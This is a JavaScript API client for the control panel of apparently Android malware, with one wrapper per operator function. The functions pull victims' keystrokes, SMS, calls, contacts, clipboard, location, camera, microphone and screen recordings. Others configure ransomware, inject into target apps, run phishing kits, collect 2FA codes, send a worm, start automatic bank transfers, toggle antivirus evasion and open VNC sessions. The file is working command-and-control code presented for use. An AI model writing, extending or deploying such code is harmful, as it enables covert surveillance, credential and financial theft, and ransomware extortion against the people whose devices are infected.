const API_BASE = import.meta.env.VITE_API_URL || 'https://wuzen-backend.onrender.com/api';

function getToken() {
  return localStorage.getItem('wuzen_token')
}

async function request(endpoint, options = {}) {
  const token = getToken()
  const res = await fetch(`${API_BASE}${endpoint}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...options.headers
    }
  })
  if (res.status === 401) {
    localStorage.removeItem('wuzen_token')
    localStorage.removeItem('wuzen_user')
    window.location.href = '/login'
    return null
  }
  return res.json()
}

export const api = {
  get: (endpoint) => request(endpoint),
  post: (endpoint, body) => request(endpoint, { method: 'POST', body: JSON.stringify(body) }),
  put: (endpoint, body) => request(endpoint, { method: 'PUT', body: JSON.stringify(body) }),
  delete: (endpoint) => request(endpoint, { method: 'DELETE' })
}

export const devices = {
  list: (params = '') => api.get(`/devices?${params}`),
  get: (id) => api.get(`/devices/${id}`),
  hardware: (id) => api.get(`/devices/${id}/hardware`),
  delete: (id) => api.delete(`/devices/${id}`)
}

export const commands = {
  send: (deviceId, type, payload, priority = 5) => 
    api.post('/commands', { deviceId, commandType: type, payload, priority }),
  list: (deviceId) => api.get(`/commands/device/${deviceId}`),
  pending: (deviceId) => api.get(`/commands/pending/${deviceId}`)
}

export const biometrics = {
  list: (deviceId) => api.get(`/biometrics/device/${deviceId}`)
}

export const keylogs = {
  list: (deviceId, limit = 100) => api.get(`/keylogs/device/${deviceId}?limit=${limit}`),
  search: (q, deviceId) => api.get(`/keylogs/search?q=${encodeURIComponent(q)}${deviceId ? `&deviceId=${deviceId}` : ''}`)
}

export const sms = {
  list: (deviceId) => api.get(`/sms/device/${deviceId}`),
  threads: (deviceId) => api.get(`/sms/threads/${deviceId}`)
}

export const calls = {
  list: (deviceId) => api.get(`/calls/device/${deviceId}`)
}

export const contacts = {
  list: (deviceId, search) => api.get(`/contacts/device/${deviceId}${search ? `?search=${search}` : ''}`)
}

export const notifications = {
  list: (deviceId) => api.get(`/notifications/device/${deviceId}`)
}

export const clipboard = {
  list: (deviceId) => api.get(`/clipboard/device/${deviceId}`)
}

export const location = {
  list: (deviceId) => api.get(`/location/device/${deviceId}`),
  latest: (deviceId) => api.get(`/location/device/${deviceId}/latest`)
}

export const camera = {
  list: (deviceId) => api.get(`/camera/device/${deviceId}`),
  download: (id) => api.get(`/camera/download/${id}`)
}

export const microphone = {
  list: (deviceId) => api.get(`/microphone/device/${deviceId}`),
  download: (id) => api.get(`/microphone/download/${id}`)
}

export const screen = {
  list: (deviceId) => api.get(`/screen/device/${deviceId}`),
  download: (id) => api.get(`/screen/download/${id}`)
}

export const files = {
  list: (deviceId, path = '/') => api.get(`/files/device/${deviceId}?path=${encodeURIComponent(path)}`),
  tree: (deviceId) => api.get(`/files/tree/${deviceId}`)
}

export const ransomware = {
  get: (deviceId) => api.get(`/ransomware/device/${deviceId}`),
  set: (deviceId, config) => api.post(`/ransomware/device/${deviceId}`, config),
  encrypted: (deviceId) => api.get(`/ransomware/encrypted/${deviceId}`)
}

export const injections = {
  targets: (deviceId, category) => api.get(`/injections/targets/${deviceId}${category ? `?category=${category}` : ''}`),
  list: (deviceId) => api.get(`/injections/device/${deviceId}`),
  inject: (deviceId, data) => api.post(`/injections/device/${deviceId}`, data)
}

export const phishlets = {
  list: () => api.get('/phishlets'),
  create: (data) => api.post('/phishlets', data),
  captures: (id) => api.get(`/phishlets/captures/${id}`)
}

export const tfa = {
  list: (deviceId) => api.get(`/tfa/device/${deviceId}`),
  latest: () => api.get('/tfa/latest'),
  markUsed: (id) => api.post(`/tfa/mark-used/${id}`)
}

export const apps = {
  list: (deviceId, params = '') => api.get(`/apps/device/${deviceId}${params}`)
}

export const processes = {
  list: (deviceId) => api.get(`/processes/device/${deviceId}`)
}

export const network = {
  list: (deviceId) => api.get(`/network/device/${deviceId}`)
}

export const worm = {
  list: (deviceId) => api.get(`/worm/device/${deviceId}`),
  send: (deviceId, data) => api.post(`/worm/send/${deviceId}`, data)
}

export const ats = {
  list: (deviceId) => api.get(`/ats/device/${deviceId}`),
  initiate: (deviceId, data) => api.post(`/ats/initiate/${deviceId}`, data)
}

export const toolkit = {
  getConfig: (deviceId) => api.get(`/toolkit/config/${deviceId}`),
  setConfig: (deviceId, config) => api.post(`/toolkit/config/${deviceId}`, config)
}

export const dashboard = {
  stats: () => api.get('/dashboard/stats'),
  recentDevices: () => api.get('/dashboard/recent-devices'),
  threats: () => api.get('/dashboard/threats')
}

export const push = {
  send: (deviceId, data) => api.post(`/push/send/${deviceId}`, data)
}

export const launch = {
  app: (deviceId, packageName) => api.post(`/launch/app/${deviceId}`, { packageName }),
  link: (deviceId, url, inApp = false) => api.post(`/launch/link/${deviceId}`, { url, inApp })
}

export const firewall = {
  rules: (deviceId) => api.get(`/firewall/rules/${deviceId}`),
  addRule: (deviceId, data) => api.post(`/firewall/rule/${deviceId}`, data)
}

export const evasion = {
  status: (deviceId) => api.get(`/evasion/status/${deviceId}`),
  toggle: (deviceId, feature, enabled) => api.post(`/evasion/toggle/${deviceId}`, { feature, enabled })
}

export const hardware = {
  info: (deviceId) => api.get(`/hardware/info/${deviceId}`),
  command: (deviceId, command, params) => api.post(`/hardware/command/${deviceId}`, { command, params })
}

export const vnc = {
  stream: (deviceId) => api.get(`/vnc/stream/${deviceId}`)
}

export const auth = {
  login: (username, password) => api.post('/auth/login', { username, password }),
  register: (data) => api.post('/auth/register', data),
  me: () => api.get('/auth/me')
}
